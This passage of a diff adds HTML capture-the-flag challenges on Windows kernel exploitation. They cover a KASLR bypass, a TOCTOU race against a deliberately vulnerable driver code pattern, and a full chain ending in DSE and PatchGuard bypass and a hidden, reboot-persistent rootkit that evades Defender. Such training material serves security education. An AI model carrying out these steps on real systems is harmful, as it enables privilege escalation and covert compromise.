+            <li><strong>WMI/COM objects:</strong> Some COM interfaces may leak pool or module addresses</li>
+          </ol>
+          <h6>Validation:</h6>
+          <ol>
+            <li>Run exploit 100 times</li>
+            <li>Report: correct kernel base recovery rate, average time per leak</li>
+            <li>Confirm process runs at Medium IL (non-elevated)</li>
+          </ol>
+          <p><strong>Flag:</strong> Working KASLR bypass from Medium IL with >90% reliability + analysis of entropy reduction</p>
+        </div>
+      </div>
+
+      <!-- CTF 11 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 11: Race Condition — Kernel TOCTOU Exploitation</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Custom driver or real CVE reproduction</p>
+          <p><strong>Difficulty:</strong> Medium-Hard</p>
+          <p><strong>Objective:</strong> Exploit a Time-of-Check to Time-of-Use (TOCTOU) race condition in a kernel driver.</p>
+          <h6>Scenario:</h6>
+          <p>A driver validates a user-mode buffer pointer, then later dereferences it. Between check and use, remap the page to point elsewhere.</p>
+<pre><code class="language-c">// Vulnerable driver code pattern:
+NTSTATUS VulnerableIOCTL(PIRP Irp) {
+    PUSER_DATA pData = Irp->AssociatedIrp.SystemBuffer;
+    
+    // CHECK: validate pointer is in user range
+    if ((ULONG64)pData->TargetAddress > MmHighestUserAddress) {
+        return STATUS_INVALID_PARAMETER;
+    }
+    
+    // ... other processing (time passes) ...
+    
+    // USE: write to the validated address
+    // RACE: attacker remapped this VA to kernel space between check and use!
+    *(ULONG64*)pData->TargetAddress = pData->Value;
+    return STATUS_SUCCESS;
+}</code></pre>
+          <h6>Exploitation:</h6>
+          <ol>
+            <li>Create two threads: one spamming the IOCTL, one remapping the target VA</li>
+            <li>Initially, target VA points to user memory (passes check)</li>
+            <li>Racer thread calls <code>NtMapViewOfSection</code> / <code>VirtualFree+VirtualAlloc</code> to remap</li>
+            <li>If timing aligns: driver writes to kernel address (passes check, writes to remapped page)</li>
+            <li>Use this arbitrary write for privilege escalation</li>
+          </ol>
+          <p><strong>Flag:</strong> Reliable exploit with >50% hit rate within 1000 attempts</p>
+        </div>
+      </div>
+
+      <!-- CTF 12 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Challenge 12: Full Chain — User to Kernel to Persistence</h5></div>
+        <div class="card-body">
+          <p><strong>Platform:</strong> Windows 10 21H2 (specific build provided)</p>
+          <p><strong>Difficulty:</strong> Expert</p>
+          <p><strong>Objective:</strong> Complete exploit chain from unprivileged user to kernel-mode persistence.</p>
+          <h6>Requirements:</h6>
+          <ol>
+            <li><strong>Stage 1 — Local Privilege Escalation:</strong> Exploit a user-mode vulnerability or misconfiguration to gain admin</li>
+            <li><strong>Stage 2 — KASLR Defeat:</strong> Leak kernel base address</li>
+            <li><strong>Stage 3 — Kernel Exploit:</strong> Use BYOVD or HEVD vulnerability for kernel R/W</li>
+            <li><strong>Stage 4 — Protection Bypass:</strong> Disable DSE + PatchGuard</li>
+            <li><strong>Stage 5 — Persistence:</strong> Load a custom rootkit driver that:
+              <ul>
+                <li>Hides a specific process from task manager</li>
+                <li>Hides a registry key</li>
+                <li>Survives reboot (driver set to boot-start or registry persistence)</li>
+              </ul>
+            </li>
+          </ol>
+          <h6>Scoring:</h6>
+          <ul>
+            <li>Each stage: 20 points</li>
+            <li>Bonus: Stealth (no Defender/Sysmon alerts): +25 points</li>
+            <li>Bonus: Works on latest build: +25 points</li>
+          </ul>
+          <p><strong>Flag:</strong> Hidden process running as SYSTEM + hidden registry key + persistence across reboot</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+</body>
+</html>
